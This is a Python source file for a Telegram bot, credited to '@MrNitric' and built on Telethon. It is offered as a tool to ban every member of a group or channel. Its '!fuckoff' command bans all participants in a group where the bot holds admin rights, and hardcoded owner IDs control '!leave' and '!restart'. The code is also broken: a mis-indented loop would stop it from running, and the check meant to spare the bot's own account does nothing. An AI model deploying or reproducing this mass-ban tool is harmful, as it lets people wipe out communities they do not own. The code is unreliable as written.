#Copyright @MrNitric ||| 

import logging
import re
import os
import sys
import asyncio
from telethon import TelegramClient, events
import telethon.utils
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from asyncio import sleep
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins, ChatAdminRights
from telethon.tl.functions.channels import EditBannedRequest
from datetime import datetime
from Badnam import Var
from telethon import Button


logging.basicConfig(level=logging.INFO)

print("Nitric xD...")

TeamxD = TelegramClient('TeamxD', Var.API_ID, Var.API_HASH).start(bot_token=Var.TOKEN)

BDOP = [5154093666, 5161717680] 
    for x in Var.SUDO: 
    BDOP.append(x)

print("Bᴏᴏᴛɪɴɢ...")

@TeamxD.on(events.NewMessage(pattern="^!ping"))  
async def ping(e):
        start = datetime.now()
        text = "NɪᴛʀɪᴄxD!"
        event = await e.reply(text, parse_mode=None, link_preview=None )
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await event.edit(f"**Fᴜᴄᴋ Oꜰꜰ Mᴏɪɪ Sᴏɴ** \n\n __Pᴏɴɢ__ !! `{ms}` ms")

print("Sᴛᴀʀᴛɪɴɢ Pɪɴɢ......")

@TeamxD.on(events.NewMessage(pattern="^!online"))  
async def ping(e):
        start = datetime.now()
        text = "Cʀᴀᴛᴛɪɴɢ..."
        event = await e.reply(text, parse_mode=None, link_preview=None )
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await event.edit(f"**Mᴇ Iᴢᴢ Aʟɪᴠᴇ**\n\n __Nɪᴛʀɪᴄ xD__ !! `{ms}` ms")

print("Lᴏᴀᴅɪɴɢ BᴀɴAʟʟ...")
@TeamxD.on(events.NewMessage(pattern="^!fuckoff"))
async def testing(event):
   if not event.is_group:
        Reply = f"Pʟᴇᴀsᴇ! Usᴇ ᴛʜɪs ᴄᴍᴅ ɪɴ ɢʀᴏᴜᴘ."
        await event.reply(Reply, parse_mode=None, link_preview=None )
   else:
       await event.delete()
       userchat = await event.get_chat()
       BADNAM = await event.client.get_me()
       admin = userchat.admin_rights
       creator = userchat.creator
       if not admin and not creator:
           await event.reply("Pʟᴇᴀsᴇ ᴄᴏɴғɪʀᴍ ᴍʏ ʀɪɢʜᴛs !!")
           return
       await event.reply("Fᴜᴋɪɴɢ !! Sᴛᴀʀᴛᴇᴅ...Bʏ Nɪᴛʀɪᴄ xD...")
       everyone = await event.client.get_participants(event.chat_id)
       for user in everyone:
           if user.id == BADNAM.id:
               pass
           try:
               await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None,view_messages=True)))
           except Exception as e:
               await event.edit(str(e))
           await sleep(0.0)

print("Lᴏᴀᴅɪɴɢ Lᴇᴀᴠᴇ...")

@TeamxD.on(events.NewMessage(pattern="^!leave"))
async def _(e):
      if e.sender_id in BDOP:
        userchat = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = userchat[0]
            bc = int(bc)
            text = "Lᴇᴀᴠɪɴɢ..."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await event.client(LeaveChannelRequest(bc))
                await event.edit("Sᴜᴄᴄᴇssғᴜʟʟʏ Lᴇғᴛ")
            except Exception as e:
                await event.edit(str(e))   
        else:
            bc = e.chat_id
            text = "Lᴇᴀᴠɪɴɢ....."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await event.client(LeaveChannelRequest(bc))
                await event.edit("Fᴜᴄᴋɪɴɢ Sᴛᴏᴘᴘᴇᴅ...Cᴏɴᴛᴀᴄᴛ Nɪᴛʀɪᴄ xD.")
            except Exception as e:
                await event.edit(str(e))   
          

print("Lᴏᴀᴅɪɴɢ Rᴇsᴛᴀʀᴛ...")

@TeamxD.on(events.NewMessage(pattern="^!restart"))
async def restart(e):
      if e.sender_id in BDOP:
        text = "__Rᴇsᴛᴀʀᴛɪɴɢ__ , Tɪᴍᴇ ɪᴢᴢ ᴜᴘ !!"
        await e.reply(text, parse_mode=None, link_preview=None )
        try:
            await TeamxD.disconnect()
        except Exception:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()


#start
@TeamxD.on(events.NewMessage(pattern="^/start$"))
async def start(event):
  await event.reply(
"""────「 [𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐀𝐜𝐭𝐢𝐨𝐧](https://telegra.ph/file/ba38ba16fdf2f6e45fa4c.png) 」────
*Hᴇʏ !!,*
Wᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴛɪᴏɴ ʙᴏᴛ's ᴍᴇɴᴜ. \n I ᴄᴀɴ ʙᴀɴ ᴀʟʟ ᴍᴇᴍʙᴇʀs ɪɴ ɢʀᴏᴜᴘs ᴀɴᴅ ᴄʜᴀɴɴᴇʟs.
➖➖➖➖➖➖➖➖➖➖➖➖➖
‣ Managed By - @MrNitric ❥︎
➖➖➖➖➖➖➖➖➖➖➖➖➖
➛ Nᴇᴇᴅ Hᴇʟᴘ /help ××
""",
    buttons=(
                      [
                         Button.url('📣 ᴜᴘᴅᴀᴛᴇs', 'https://t.me/Sanki_BOTs'), 
                         Button.url('sᴜᴘᴘᴏʀᴛ ⭐', 'https://t.me/The_Friend_Circle'), 
                      ], 
                      [
                        Button.url('➕ ᴀᴅᴅ ᴍᴇ ᴛᴏ ʏᴏᴜʀ ɢʀᴏᴜᴘ', 'https://t.me/TgActionBot?startgroup=true'),   
                      ]
                   ), 
                    link_preview=False
                   )

#help
@TeamxD.on(events.NewMessage(pattern="^/help$"))
async def help(event):
  helptext = "**Telegram Action Bot's Help Menu**\n\nCommands:\n\n `!ping` - Check Ping Status Bot.. \n\n `!online` - For Check Bot Alive Or Not. \n\n `!fuckoff` - For Ban All Members In Group.\n\n `!leave` - For Leave Chat Group From Bot.\n\n `!restart` - For Restart Your Bot."
  await event.reply(helptext,
                    buttons=(
                      [
                         Button.url('📣 ᴜᴘᴅᴀᴛᴇs', 'https://t.me/Sanki_BOTs'), 
                         Button.url('sᴜᴘᴘᴏʀᴛ ⭐', 'https://t.me/The_Friend_Circle'), 
                      ], 
                      [
                        Button.url('➕ ᴀᴅᴅ ᴍᴇ ᴛᴏ ʏᴏᴜʀ ɢʀᴏᴜᴘ', 'https://t.me/TgActionBot?startgroup=true'),   
                      ]
                   ), 
                    link_preview=False
                   )

print("\n\n")
print("Bᴏᴛ Dᴇᴘʟᴏʏᴍᴇɴᴛ Sᴜᴄᴄᴇss!! Iғ Aɴʏ Pʀᴏʙʟᴇᴍ Fᴀᴄɪɴɢ Tʜᴇɴ Cᴏɴᴛᴀᴄᴛ @MrNitric")

TeamxD.run_until_disconnected()
